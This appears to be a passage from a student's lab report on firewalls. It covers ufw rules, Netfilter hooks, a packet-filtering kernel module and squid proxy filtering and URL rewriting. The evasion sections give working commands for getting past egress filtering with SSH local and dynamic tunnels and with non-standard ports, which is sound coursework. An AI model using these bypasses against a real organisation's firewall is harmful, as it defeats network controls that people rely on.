\item Prevent Machine A from visiting an external website. (Note that some websites have multiple IP addresses)
\end{itemize}
The manipulation of the firewall is performed on machine A while the firewall on machine B is untouched and left at the default setting.

\begin{figure}[H]
\centering
\begin{tikzpicture}			

\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
\draw (-5.3,2.3) rectangle (-3.7,1.1);
\draw (-4.1,1.1) rectangle (-4.9,0.6);
\draw (-5.1,0.75) -- (-5.5,0.4);
\draw (-3.9,0.75) -- (-3.5,0.4);
\draw (-5.5,0.4) -- (-3.5,0.4);
\draw (-5.1,0.75) -- (-4.9,0.75);
\draw (-3.9,0.75) -- (-4.1,0.75);
\draw (-4.5,-0.3) node[text width=3cm, align=center]{Machine A};

	\draw[fill=red!10] (3.05,2.15) rectangle (4.35,1.25);
\draw (2.9,2.3) rectangle (4.5,1.1);
\draw (4.1,1.1) rectangle (3.3,0.6);
\draw (3.1,0.75) -- (2.7,0.4);
\draw (4.3,0.75) -- (4.7,0.4);
\draw (2.7,0.4) -- (4.7,0.4);
\draw (3.1,0.75) -- (3.3,0.75);
\draw (4.3,0.75) -- (4.1,0.75);
\draw (3.64 ,-0.3) node[text width=4.5cm, align=center]{Machine B};

\draw(-1.4,1.35) node{\includegraphics[width=0.14\linewidth]{firewall.png}};

\draw[rounded corners=8pt] (-6,2.65) rectangle (-0.4,-0.9);
\draw[rounded corners=8pt] (2,2.65) rectangle (5.2,-0.9);

\draw[->,line width=0.5mm](-3.7,1.6) -- (-2.34,1.6);
\draw[red,line width=0.8mm](-2.82,1.4) -- (-3.22,1.8);
\draw[red,line width=0.8mm](-2.82,1.8) -- (-3.22,1.4);

\draw[->,line width=0.5mm](2.9,1.3) -- (-0.91,1.3);
\draw[red,line width=0.8mm](0.8,1.1) -- (1.2,1.5);
\draw[red,line width=0.8mm](0.8,1.5) -- (1.2,1.1);
	\end{tikzpicture}
\caption{Firewall Setup}
\label{fig:Firewall}
\end{figure}
\begin{enumerate}
\item To prevent Machine A from executing \texttt{Telnet} to Machine B, it is known that Telnet uses (TCP) port 23. Furthermore from the ``Remote DNS Attack Lab'', source ports are randomised to prevent common ports from being hacked. Therefore, the firewall must block the destination ports instead.\\\\Using \texttt{ufw}, there are multiple ways to block \texttt{Telnet} from being used from Machine A to Machine B. Below are two different methods that can be used to block outgoing \texttt{Telnet} packets.
\begin{verbatim}
$ ufw deny out to any port 23
$ ufw reject out telnet
\end{verbatim}
The commands \texttt{ufw disable} and \texttt{ufw enable} have to be used to force the firewall to enforce the new firewall rules. (*Note: because Telnet is a well known program that uses TCP port 23, the second line of code can be used. Otherwise the first line is more straightforward and direct.)\\\\
Blocking \texttt{Telnet} on the firewall level will prevent the packets from reaching the intended destination and eventually force \texttt{Telnet} to timeout, as shown in the figure below.


\begin{figure}[H]
    \centering
\begin{subfigure}[H]{0.45\textwidth}
\centering
\includegraphics[width=1\linewidth]{telnetmachB}
\caption{Before Firewall Rule}
\label{fig:MachB}
\end{subfigure}
~
\begin{subfigure}[H]{0.45\textwidth}
\centering
\includegraphics[width=1\linewidth]{telnetmachBdenied}
\caption{After Firewall Rule}
\label{fig:MachBDenied}
\end{subfigure}
    \caption{Prevent \texttt{Telnet} to External Host}
    %\label{fig:lengthdetermination}
\end{figure}

\item To prevent Machine B from executing \texttt{Telnet} to Machine A, it is the same as the previous. However, the direction of the packet flow has been swapped. Due to this, the direction when writing the commands is of importance in determining whether the blocking is successful.\\\\Again, there are two ways of blocking which is provided below.
\begin{verbatim}
$ sudo ufw deny in to any port 23
$ sudo ufw reject in telnet
\end{verbatim}
Again, the commands \texttt{ufw disable} and \texttt{ufw enable} have to be used to force the firewall to enforce the new firewall rules. Executing \texttt{Telnet} from machine B will yield the same timeout message.

\begin{figure}[H]
    \centering
\begin{subfigure}[H]{1\textwidth}
\centering
\includegraphics[width=1\linewidth]{telnetmachA}
\caption{Before Firewall Rule}
\label{fig:MachA}
\end{subfigure}
\vspace{1em}
\begin{subfigure}[H]{1\textwidth}
\centering
\includegraphics[width=1\linewidth]{telnetmachAdenied}
\caption{After Firewall Rule}
\label{fig:MachADenied}
\end{subfigure}
    \caption{Prevent \texttt{Telnet} to Current Host}
    %\label{fig:lengthdetermination}
\end{figure}
\item To prevent machine A from accessing a website, we can use \texttt{ufw} to perform the filtering. However, \texttt{ufw} is not able to block hostnames and as such the IP address must be known. In this task, the site \texttt{www.ntu.edu.sg} will be blocked. To find out the IP address of the site, the command \texttt{dig} is sufficient to reveal the A records of the hostname.\\\\To block (non-secured) websites, TCP port 80 must be blocked (443 for secured websites). Since the port numbers are directed to the server-side, outgoing packets are filtered. To do so, the following line can be used to block the site.
\begin{verbatim}
$ sudo ufw deny out to 155.69.7.173 port 80
\end{verbatim}
The firewall is restarted to effect the changes and refreshing the site will now show that the connection to the website has timed out and cannot be restored.
\begin{figure}[H]
    \centering
\begin{subfigure}[H]{0.45\textwidth}
\centering
\includegraphics[width=1\linewidth]{webAaccess}
\caption{Before Firewall Rule}
\label{fig:WebA}
\end{subfigure}
~
\begin{subfigure}[H]{0.45\textwidth}
\centering
\includegraphics[width=1\linewidth]{webAaccessdenied}
\caption{After Firewall Rule}
\label{fig:WebADenied}
\end{subfigure}
    \caption{Block Website Access}
    %\label{fig:lengthdetermination}
\end{figure}
\end{enumerate}

\noindent The \texttt{ufw} firewall uses packet filtering to inspect incoming and outgoing packets and to enforce the various policies configured by the administrator. As packet processing is performed in the kernel, as can be demonstrated in the ``Packet Sniffing and Spoofing Lab'', the filtering must also be performed within the kernel. However, using the \textit{Loadable Kernel Module} (\texttt{LKM}) and \texttt{Netfilter}, the kernel need not be rebuilt to manipulate packets. 
\\\\\noindent
\texttt{LKM} extends the functionalities of the kernel by allowing administrators to add modules without rebuilding the kernel or rebooting the computer. To process the packets and to block it, the module must be integrated into the packet processing path, which was not easily implemented before \texttt{Netfilter}.\\\\
Netfilter allows the manipulation of packets by allowing administrators to implement hooks into the Linux kernel. These hooks exists in various places and programs (within LKM) and gets invoked when packets pass through.
\\\\\textbf{Question 1:}\\
What types of hooks does \texttt{Netfilter} support and what can be done using these hooks? Draw also a diagram to show how packets flow through these hooks.\\\\
\textbf{Answer 1:}\\
There are a total of \texttt{5} hooks that can be used with \texttt{Netfilter} and these hooks can be found in the header definition of \texttt{netfilter\_ipv4.h} and \texttt{netfilter\_ipv6.h}, both located in the folder \texttt{/usr/include/linux} (If \texttt{gcc} is installed). The various hooks, together with its description are listed in the table below.

\begin{table}[H]
\footnotesize
\begin{tabular}{l|l|l}

{\underline{IPv4 Hooks}}   & {\underline{IPv6 Hooks}}    & {\underline{Description}}  \\\hline                                                                                                                                       NF\_IP\_PRE\_ROUTING  & NF\_IP6\_PRE\_ROUTING  & \begin{tabular}[c]{@{}l@{}}This hook is triggered when packets \\ enter into the network stack. After \\ that, the packet is routed or dropped \\ depending on the destination of the \\ packet.\end{tabular} \\\hline
NF\_IP\_LOCAL\_IN     & NF\_IP6\_LOCAL\_IN     & \begin{tabular}[c]{@{}l@{}}This hook is triggered when the \\ packet is designated for the local \\ system.\end{tabular} \\\hline
NF\_IP\_FORWARD       & NF\_IP6\_FORWARD       & \begin{tabular}[c]{@{}l@{}}This hook is triggered when the \\ packet is designed to be routed out to \\ another system.\end{tabular} \\\hline
NF\_IP\_LOCAL\_OUT    & NF\_IP6\_LOCAL\_OUT    & \begin{tabular}[c]{@{}l@{}}This hook is triggered when packets \\ are created locally and are outgoing \\ to the network.\end{tabular} \\\hline
NF\_IP\_POST\_ROUTING & NF\_IP6\_POST\_ROUTING & \begin{tabular}[c]{@{}l@{}}This hook is triggered just before \\ packets are to be sent out the \\ physical wire. \end{tabular}  
\end{tabular}
\caption{Table of \texttt{Netfilter} Hooks}
\label{tab:nethook}
\end{table}
\noindent *For newer kernel versions, the prefix \texttt{NF\_IP} has been changed to \texttt{NF\_INET}.\\\\The figure below depicts the different locations where the programs can hook onto the networking stack to manipulate the respective packets.
\begin{figure}[H]
	\centering
	\begin{tikzpicture}	
	\draw(-2,-2) node[text width=2cm,yshift=0.1cm]{Incoming \\Packets};
	\draw[->] (-2.2,-1.45)--(-2.2,0) -- (-0.8,0);
\draw(0,0) circle (0.8cm)node {[1]};
\draw[->](0.8,0) -- (1.8,0);
\draw (2.6,0) circle (0.8cm) node{Router};
\draw[->](2.6,-0.8) -- (2.6,-2);
\draw(2.6,-2.8)circle(0.8cm)node{[2]};
\draw[->](2.6,-3.6)--(2.6,-5);
\draw[->] (3.4,0) -- (4.4,0);
\draw (5.2,0) circle(0.8cm) node{[3]};
\draw[->] (6,0)-- (7,0);
\draw(7.8,0) circle(0.8cm) node{[4]};
\draw[->](8.6,0)-- (10,0)--(10,-1.45);
\draw(10,-2) node[text width=2cm,yshift=0.1cm]{Outgoing \\Packets};
\draw(6.5,0)--(6.5,-1);
\draw(6.5,-1.8)circle(0.8cm)node{[5]};
\draw[->](6.5,-5)--(6.5,-2.6);
\draw[densely dotted](1.6,-4) -- (7.8,-4);
\draw(4.05,-4.5)node[xshift=0.6cm]{Local System};
		\end{tikzpicture}
		\flushleft
[1]: NF\_IP\_PRE\_ROUTING\\
{[2]}: NF\_IP\_LOCAL\_IN\\
{[3]}: NF\_IP\_FORWARD\\
{[4]}: NF\_IP\_POST\_ROUTING\\
{[5]}: NF\_IP\_LOCAL\_OUT
	\caption{\texttt{Netfilter} System}
	\label{fig:NetSys}
\end{figure}
\noindent \textbf{Question 2:}\\
Where should a hook be placed for ingress and egress filtering?\\\\
\textbf{Answer 2:}\\
Ingress filtering is a technique to prevent suspicious traffic from entering the internal network. Ingress filtering checks for the validity of packets by analysing its source addresses to ensure that the IP address used does not originate within the network or any private addresses such as multicast. Therefore, an ingress filtering hook should be placed at NF\_IP\_PRE\_ROUTING, before it proceeds to any part of the network.\\\\For egress filtering, it is the opposite of ingress filtering. It checks for outgoing packets and prevents data from flowing out, such as malicious packets containing spyware. In this case, egress filtering must be hooked to NF\_IP\_POST\_ROUTING.\\\\
\textbf{Question 3:}\\
Can packets be modified using \texttt{Netfilter}?\\\\
\textbf{Answer 3:}\\
While \texttt{Netfilter} is primarily used for analysing incoming, outgoing packets and to block where required based on the firewall policy, the user can write programs (within LKM) that hook onto \texttt{Netfilter} and use it to modify packets instead.
\subsection{Optional: Implementing Packet Filtering Module}
A firewall should support dynamic configurations and be able to dynamically change firewall policies. The configuration tool runs in the user space, but the data has to be sent to the kernel space where the packet filtering module (LKM) can obtain the data. These data must reside in the kernel memory instead of a file due to performance issues. This involves interactions between a user-level program and the kernel module.\\\\
Using sample code provided by Paul Kiddie\footnote{\url{https://www.paulkiddie.com/2009/10/creating-a-simple-hello-world-netfilter-module/}}, the code is extended to drop IPv4 ICMP (ping) packets instead of all packets. Before proceeding, there are multiple ways to process the packets using our module. These definitions are located inside \texttt{netfilter.h}.
\begin{enumerate}
\itemsep0em
\item NF\_DROP: Drop packet.
\item NF\_ACCEPT: Accept packet and process through network chain.
\item NF\_STOLEN: Ownership of packet transferred to hook and \texttt{Netfilter} will not process the packet further.
\item NF\_QUEUE: Get \texttt{Netfilter} to queue the packet for userspace.
\item NF\_REPEAT: Call the hook again.
\item NF\_STOP: Accept packet and stop further processing along network chain.
\end{enumerate}
The kernel module needs to be compiled via a \texttt{Makefile}. Both the packet filtering module code and the \texttt{makefile} code have been attached to \hyperref[ch:AppA]{Appendix A}. It also interesting to note that when compiling the file via \texttt{Makefile}, the module libraries are located in \texttt{/lib/modules/\$(shell uname -r)/build/include}. This is in contrast to normal compilation using \texttt{gcc}, where the libraries are located in the folder \texttt{/usr/include}.\\\\When compiling code, it is best to ensure that there are no warnings that appear as these errors may crash the system when the module is loaded into the kernel.


\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{makecomplete}
\caption{No errors during \texttt{make}}
\label{fig:makecomplete}
\end{figure}


\noindent To add the compiled program into the kernel, the following command is used.
\begin{verbatim}
$ sudo insmod pfm.ko
\end{verbatim}
\noindent The code provided is compiled and further extended to only drop IPv4 ICMP packets. These programs are loaded into the kernel with names \texttt{pfm.ko} and \texttt{pfm2.ko} respectively. To remove the kernel modules and to display the kernel log, the following two lines can be used.
\begin{verbatim}
$ sudo rmmod pfm.ko
$ dmesg | tail -10 //Where 10 stands for the last x lines displayed
\end{verbatim}
\noindent Looking at the figures below, both \texttt{ping} and \texttt{Telnet} are used to show the different types of packets that are accepted or dropped.
\\
	\begin{figure}[H]
	\centering
		\begin{subfigure}[H]{0.45\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{pingdropall}
			\caption{Dropped \texttt{ping} Packets}
			\label{fig:pingdropall}
		\end{subfigure}
	~
		\begin{subfigure}{0.45\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{telnetdropall}
			\caption{Dropped \texttt{Telnet} Packets}
			\label{fig:telnetdropall}
		\end{subfigure}
		\caption{All Packets Dropped}
	\end{figure}
	\begin{figure}[H]
	\centering
		\begin{subfigure}{0.45\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{pingicmpdrop}
			\caption{Dropped \texttt{ping} Packets}
			\label{fig:icmppingdrop}
		\end{subfigure}
		~
		\begin{subfigure}[H]{0.45\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{telneticmpdrop}
			\caption{\texttt{Telnet} Packets Allowed}
			\label{fig:telneticmpdrop}
		\end{subfigure}
		\caption{Only ICMP Packets Dropped}
	\end{figure}
\noindent From the two figures above, all packets were dropped when the module was attached to the kernel, except for figure 8b. In can be seen that \texttt{Telnet} can be executed and the timestamp for the logs are for the dropped \texttt{ping} packets in figure 8a.
\subsection{Evading Egress Filtering}
Egress filtering is commonly used in companies and schools to restrict the use of certain services and applications. These firewalls inspect the destination IP addresses and port numbers of outgoing packets and dropped if any matches the firewall rules. Deep packet inspections are not performed on the packets due to performance reasons and therefore using the tunnelling mechanism, egress filtering can be bypassed.\\\\
Three VMs are setup to demonstrate this purpose. Machine A is behind a firewall while Machines B and C are outside of the firewall. The following firewall rules are also setup using \texttt{ufw} on Machine A as it is more convenient than re-writing the hook.
\begin{enumerate}
\itemsep0em
\item All outgoing traffic to external telnet servers are blocked. The \texttt{Telnet} server is run on Machine C and can be started using the command \texttt{sudo service openbsd-inetd start}.
\item All outgoing traffic to \texttt{www.facebook.com} are blocked to emulate the restriction in companies/schools to prevent them from being distracted. As Facebook runs on 2 IP addresses, both are blocked (including its https variants). The following lines of code are run to ensure all IP addresses of Facebook are blocked.
\begin{verbatim}
$ sudo ufw deny out to 157.240.7.38 port 80
$ sudo ufw deny out to 157.240.7.38 port 443
$ sudo ufw deny out to 157.240.7.35 port 80
$ sudo ufw deny out to 157.240.7.35 port 443
$ sudo ufw disable
$ sudo ufw enable
\end{verbatim}
To check whether the implementation is successful, the browser can either have its cache cleared or perform a force refresh (\texttt{Ctrl+R}).
\end{enumerate}
\subsubsection{\texttt{Telnet} Bypass}
To bypass the firewall, a SSH tunnel between Machine A and B can be established. This will allow all telnet traffic to go through encrypted, evading any inspection. The following line establishes a SSH tunnel from the localhost's port 8000 Machine B and packets that exit Machine B's SSH port will be forwarded to Machine C.
\begin{verbatim}
$ ssh -L 8000:<Machine C IP>:23 seed@<Machine B IP>
\end{verbatim}
More details on the local and remote forwarding switches can be found on the \href{https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot}{Unix Stack Exchange}.

\begin{figure}[H]
\centering
\begin{tikzpicture}			

\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
\draw (-5.3,2.3) rectangle (-3.7,1.1);
\draw (-4.1,1.1) rectangle (-4.9,0.6);
\draw (-5.1,0.75) -- (-5.5,0.4);
\draw (-3.9,0.75) -- (-3.5,0.4);
\draw (-5.5,0.4) -- (-3.5,0.4);
\draw (-5.1,0.75) -- (-4.9,0.75);
\draw (-3.9,0.75) -- (-4.1,0.75);
\draw (-4.5,-0.3) node[text width=3cm, align=center]{Machine A};

	\draw[fill=red!10] (3.05,2.15) rectangle (4.35,1.25);
\draw (2.9,2.3) rectangle (4.5,1.1);
\draw (4.1,1.1) rectangle (3.3,0.6);
\draw (3.1,0.75) -- (2.7,0.4);
\draw (4.3,0.75) -- (4.7,0.4);
\draw (2.7,0.4) -- (4.7,0.4);
\draw (3.1,0.75) -- (3.3,0.75);
\draw (4.3,0.75) -- (4.1,0.75);
\draw (3.64 ,-0.3) node[text width=4.5cm, align=center]{Machine B};

	\draw[fill=yellow!10] (3.05,-0.85) rectangle (4.35,-1.75);
\draw (2.9,-0.7) rectangle (4.5,-1.9);
\draw (4.1,-1.9) rectangle (3.3,-2.4);
\draw (3.1,-2.25) -- (2.7,-2.6);
\draw (4.3,-2.25) -- (4.7,-2.6);
\draw (2.7,-2.6) -- (4.7,-2.6);
\draw (3.1,-2.25) -- (3.3,-2.25);
\draw (4.3,-2.25) -- (4.1,-2.25);
\draw (3.64 ,-3.3) node[text width=4.5cm, align=center]{Machine C};

\draw(-1.15,1.25) node{\includegraphics[width=0.20\linewidth,height=0.3\linewidth]{firewall.png}};

\draw[rounded corners=8pt] (-6,3.7) rectangle (-0,-0.9);
\draw[rounded corners=8pt] (2,2.65) rectangle (5.2,-3.9);

\draw[yellow,line width=0.5mm](-2.53,1.45) -- (-0.44,1.45);
\draw[line width=0.5mm](-3.7,1.45) -- (-2.53,1.45);
\draw[->,line width=0.5mm](-0.44,1.45) -- (2.9,1.45);
%\draw[red,line width=0.8mm](-2.82,1.2) -- (-3.22,1.6);
%\draw[red,line width=0.8mm](-2.82,1.6) -- (-3.22,1.2);
\draw[->,line width=0.5mm,bend right](2.9,1.35) to (2.9,-1.1);
\draw[<-,line width=0.5mm](2.9,-1.3) -- (-0.46,-0.06);
\draw[->,line width=0.5mm](-3.7,1.3) -- (-2.53,0.8);

\draw[red,line width=0.8mm](0.8,-0.77) -- (1.2,-0.37);
\draw[red,line width=0.8mm](0.8,-0.37) -- (1.2,-0.77);

\draw(-3.2,1.45)--(-3.2,3.8)node[yshift=0.2cm]{TCP port 8000};
\draw(1.3,1.45)--(1.3,3.8)node[yshift=0.2cm]{TCP port 22};
\draw(-3.2,1.10)--(-3.2,-2.1)node[yshift=-0.2cm]{TCP port 23};
\draw(-3.2,-1.8)-- (1.55,-1.8)--(1.55,-0.5)--(2.65,-0.5);
\draw(1.3,3)--(1.55,3)--(1.55,1.1)--(2.8,1.1);
	\end{tikzpicture}
	\flushleft
	Machine A has IP address 192.168.43.157\\Machine B has IP address 192.168.43.154\\Machine C has IP address 192.168.43.156
\caption{SSH Tunneling}
\label{fig:SSHTun}
\end{figure}

\noindent Once the SSH tunnel has been established, another Terminal window is opened. To connect to Machine C, we will force \texttt{Telnet} to use port 8000 since the packet will be forwarded to Machine C via the SSH tunnel.
\begin{verbatim}
$ telnet localhost 8000
\end{verbatim}
Using this method, Machine A can successfully be connected to Machine C via \texttt{Telnet}. The \texttt{ifconfig} is run to check whether the IP address of the connected system is correct and this is shown in the figure below.

\begin{figure}[H]
\centering
\includegraphics[width=1\linewidth]{telnetegressok}
\caption{Successfully Connected to Machine C}
\label{fig:telnetegressok}
\end{figure}
\noindent Wireshark is looked at and it can be seen that one cycle out from and back to Machine A includes
\begin{enumerate}
\itemsep0em
\item Sending an encrypted packet from Machine A to Machine B via SSH
\item Machine B sending \texttt{Telnet} data to Machine C
\item Machine C returns back \texttt{Telnet} acknowledgement data and packet
\item Machine B sends the data back to Machine A in an encrypted response packet via SSH
\end{enumerate}
Packet numbers 18 -- 22 in the Wireshark screen capture below show the corresponding interactions between all three machines to transfer data.
\begin{figure}[H]
\centering
\includegraphics[width=1\linewidth]{wiresharkegress}
\caption{Wireshark Packet Flow}
\label{fig:wiresharkegress}
\end{figure}
\subsubsection{Facebook Bypass}
In this task, the same approach using static port forwarding can be used to bypass the firewall. However, dynamic port forwarding can also be used. Instead of requiring that the destination IP address and port number be specified, these can now be omitted. Using dynamic port forwarding only requires the source port and the intermediary IP address be specified, as the intermediary system will determine where it will forward based on the destination IP address encoded in the packet.\\\\The following command allows us to perform dynamic port forwarding using SSH.
\begin{verbatim}
$ ssh -D 9000 -C seed@<Machine B IP>
\end{verbatim}
The \texttt{-D} flag is used to specify that it is a dynamic port forwarding tunnel and the \texttt{-C} flag is used to force data compression.\\\\To make use of port 9000 SSH tunnel, the browser must also be configured to make use of it. To configure Firefox, navigate to \texttt{Edit > Preferences > Advanced > Network > Settings}. Under ``Manual proxy configuration'', SOCKS Host should be set to either \texttt{localhost} or 127.0.0.1, port set to 9000 and ``SOCKS v5'' selected. Under ``No Proxy for:'', the entries should be \texttt{localhost, 127.0.0.1}.
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{FFConfig}
\caption{Firefox Configuration}
\label{fig:ffconfig}
\end{figure}

\noindent When the SSH tunnel is running in the background on a \texttt{Terminal} window, Facebook can be accessed normally via the browser. If the SSH tunnel is broken, Facebook will again be blocked due to the firewall (after removing the proxy settings).

\begin{figure}[H]
	\centering
		\begin{subfigure}[H]{0.8\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{facebookegressok}
			\caption{Accessing Facebook via SSH}
			\label{fig:FacebookSSH}
		\end{subfigure}
		\begin{subfigure}{0.8\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{facebooktimeout}
			\caption{Blocked Without SSH}
			\label{fig:FacebookBlock}
		\end{subfigure}
		\caption{Differences with SSH Tunnel}
	\end{figure}
\noindent Using Wireshark to analyse the transmitted packets, the same pattern is reflected as the previous task on \texttt{Telnet}. The data is transmitted to Machine C via SSH and it is then forwarded over to Facebook's servers (Client Hello). The server returns back the response to Machine C and it is forwarded back to Machine A via SSH.

\begin{figure}[H]
\centering
\includegraphics[width=1\linewidth]{Wiresharkfacebook}
\caption{Proxy Packet Transfer}
\label{fig:wiresharkfacebook}
\end{figure}

\noindent \textbf{Question 4:}\\
If \texttt{ufw} blocks SSH TCP port 22, can a SSH tunnel still be set up to evade egress filtering?\\
\\\textbf{Answer 4:}\\
Yes. Both on the server and client side, the port number for SSH can be changed by modifying the file \texttt{/etc/ssh/sshd\_config}. For this example, the port number is changed from 22 to 26. The SSH service is then restarted and tested. For convenience, the \texttt{-p} switch is sufficient to show that a SSH tunnel can be established.

\begin{figure}[H]
\centering
\includegraphics[width=0.8\linewidth]{SSHegressbypass}
\caption{SSH Egress Filtering Bypassed}
\label{fig:sshegressbypass}
\end{figure}

\noindent Again, we see from the figure above that we can obtain a connection to a remote server and obtain the server's IP address, bypassing the \texttt{ufw} firewall.
\subsection{Web Proxy -- Application Firewall}
Application firewalls are another type of firewall that can be used to filter packets. Instead of inspecting data at the layer data (looking at the header fields of the packets), these firewalls look at application-layer data. These firewalls control access from/to applications or services. 

\subsubsection{\texttt{squid} Server Setup}
A common implementation of this firewall are web proxies. For this lab, the web proxy that will be used is \texttt{squid} and can be installed by executing \texttt{sudo apt-get squid}.\\\\After installation, the firewall policies can be set-up by modifying the file \texttt{squid.conf} in the folder \texttt{/etc/squid3}. The \texttt{squid} server needs to be restarted every time a modification has been done to the file, otherwise the new rules will not effect.\\\\Two VMs are set-up for this task, Machine A and B. Machine A will emulate the system that requires its browsing restricted and Machine B will run the web proxy. To configure the browser for Machine A, the ``HTTP Proxy'' option is set to Machine B's IP address and port 3128 (default port for \texttt{squid} service).

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{FFProxyConf}
\caption{Proxy Configuration Settings}
\label{fig:ffproxyconf}
\end{figure}
\noindent After configuration, any website that is visited will show an access denied error. Also, we notice that at the footer that \texttt{squid} and the version of the software is mentioned when the site is blocked. This shows that the configuration of the software is correct and that all sites are blocked by default after installing \texttt{squid}.

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{squidblock}
\caption{Blocked By Proxy}
\label{fig:squidblock}
\end{figure}
\noindent To check why all sites are blocked, the configuration file needs to be accessed. To find the line causing this quickly, this line is used.
\begin{verbatim}
$ cat /etc/squid3/squid.conf | grep deny
\end{verbatim}
\noindent The lines that stands out from the printed result are in the firewall access block of code. In this block, every site is denied with the exception of localhost sites, which are not affected.
\begin{verbatim}
http_access deny manager
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
#http_access deny to_localhost
# And finally deny all other access to this proxy
http_access deny all
\end{verbatim}
To allow all websites through the web proxy, an Access Control List (ACL) needs to be created. By doing so, we can allow this ACL to access any website. The following lines must be added \textbf{before} \texttt{http\_access deny all}.
\begin{verbatim}
acl all src 0.0.0.0/0   #acl <acl name> <type> <data>
http_access allow all   #http_access <allow/deny> <acl name>
\end{verbatim}
\noindent To allow specific sites like \texttt{google.com} to be accessed and other sites blocked, the ACL needs to be used. The previous entries need to be commented out or it will conflict with the current ACL.
\begin{verbatim}
#acl all src 0.0.0.0/0
#http_access allow all
acl google dstdomain .google.com.
http_access allow google
\end{verbatim}

\begin{figure}[H]
\begin{subfigure}{0.45\textwidth}
\centering
\includegraphics[width=0.95\linewidth]{gaccess}
\caption{Access to Google}
\label{fig:blockaccess}
\end{subfigure}
~
\begin{subfigure}{0.45\textwidth}
\centering
\includegraphics[width=0.95\linewidth]{blockaccess}
\caption{Blocked to Anywhere Else}
\label{fig:gaccess}
\end{subfigure}
\caption{Selective Access via ACL}
\end{figure}
\noindent Analysing the captured packets via Wireshark, we noticed that for Google the packet flow was the same as when SSH was used. The data is passed from Machine A to the web proxy and that data was forwarded to the respective destination IP address and port. Similarly, return of data from the destination goes through the web proxy and back to Machine A.\\\\However, for the site that was denied, the data goes through from Machine A to the web proxy but is now returned an access denied page. This is in contrast to the previous firewall where the packets are dropped.
\subsubsection{Firewall Evasion}
\textbf{Question 5:}\\If \texttt{ufw} blocks TCP port 3128, can the web proxy still be used to evade the firewall?\\\\\textbf{Answer 5:}\\Yes. Similar to the SSH tunnel, the listening port for the \texttt{squid} server can still be changed to some arbitrary port number. To show that this is possible, an entry in the \texttt{ufw} firewall is added to block any packets to destination port 3128.
\begin{verbatim}
$ sudo ufw deny out 3128/tcp
$ sudo ufw disable
$ sudo ufw enable 
\end{verbatim}
\noindent A random port number is selected, for this scenario the port number is amended to 10000. Port numbers below 1024 are usually reserved for specific applications and it is highly advisable to not use that range.\\\\
In the \texttt{squid.conf} file, the line \texttt{http\_port} is searched for (\texttt{Ctrl + W} in nano) and modified.\\\\
\texttt{http\_port 3128 $\rightarrow$ http\_port 10000}\\\\
The \texttt{squid} service is restarted and the browser is configured to use port 10000 also.

\begin{figure}[H]
\begin{subfigure}{1\textwidth}
\centering
\includegraphics[width=0.95\linewidth]{portconf}
\caption{\texttt{squid} Port Configuration}
\label{fig:squidport}
\end{subfigure}
\\
\begin{subfigure}{1\textwidth}
\centering
\includegraphics[width=0.95\linewidth]{accessbypass}
\caption{Access Re-established}
\label{fig:bypasssquid}
\end{subfigure}
\caption{Firewall Bypassed}
\end{figure}
\subsection{URL Rewriting/Redirection}
\subsubsection{\texttt{myprog.pl}}
Apart from acting as a firewall, \texttt{squid} can also be used to rewrite URLs to redirect users to another web site. This can be done using any type of programming language. A perl program \texttt{myprog.pl} has been provided to demonstrate URL rewriting capabilities. It has been attached to \hyperref[ch:AppB]{Appendix B}.\\\\In short, the code checks whether the URL entered is identical to \texttt{www.ntu.edu.sg}. If it is, then the user is redirected to \texttt{www.google.com.sg}. The operator \texttt{=\~} is used to check if the string is identical and not exact/equal (\texttt{==}).\\\\To attach the the program to \texttt{squid}, the following lines are added to the \texttt{squid.conf} file.
\begin{verbatim}
url_rewrite_program /home/seed/myprog.pl #Location of file
url_rewrite_children 5
\end{verbatim}
The perl file must be marked as executable (using \texttt{chmod +x}) or the firewall will not work. In the event the file cannot be found by \texttt{squid}, the URL rewrite program can be placed in \texttt{/etc/squid3} instead. \\\\
As previously mentioned, any attempt to view the site \texttt{www.ntu.edu.sg} will redirect the user to \texttt{www.google.com.sg}. The packets from this action are captured in Wireshark and analysed in detail. In particular, we look into the initial packet that was sent over the wire to the server and follow the packet stream. This action can be done by right-clicking the corresponding packet and selecting the option ``Follow TCP Stream''. The data printed shows that the web proxy replies with a ``HTTP 302 Moved Temporarily'' and the rewritten URL response instead of forwarding the response to our intended destination.

\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{tcpstream}
\caption{TCP Stream Data}
\label{fig:tcpstream}
\end{figure}
\subsubsection{Replace Facebook Pages With Stop Sign}
In this lab instead of redirecting users from a legitimate site to another, we redirect users from Facebook to a big red stop sign to act as a deterrent to prevent users from being distracted. The same program is used with some modifications and it has been reflected in \hyperref[ch:AppBStop]{Appendix B}.\\\\Again, typing \texttt{facebook.com} into the browser will force a redirection to a stop sign. This is evident if the TCP stream was followed in Wireshark.

\begin{figure}[H]
\centering
\begin{subfigure}{0.48\textwidth}
\centering
\includegraphics[width=1\linewidth]{stopsign}
\caption{Facebook Redirect}
\label{fig:stopsign}
\end{subfigure}
~
\begin{subfigure}{0.48\textwidth}
\centering
\includegraphics[width=1\linewidth]{facebookstop}
\caption{Stream Capture}
\label{fig:facebookstop}
\end{subfigure}
\caption{Image Redirect}
\end{figure}
\subsubsection{Replacing All Images In A Page}
This part will look at replacing all images on a web page with an image of our choice. When an image is loaded on the page, it will immediately send a URL request for each image. These URLs will be identified and replaced accordingly by the web proxy. The provided code again has been attached to \hyperref[ch:AppBImgMod]{Appendix B}.\\\\A site that has multiple images is accessed, such as the NTU homepage. All images that end with any mentioned image extension (in the code) will have it replaced by a stop sign. This is evident as all the images have been replaced, such as shown in the figure below.
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{ntudeface}
\caption{NTU Defaced via Web Proxy URL Rewriting (Zoomed out to 30\%)}
\label{fig:ntudeface}
\end{figure}
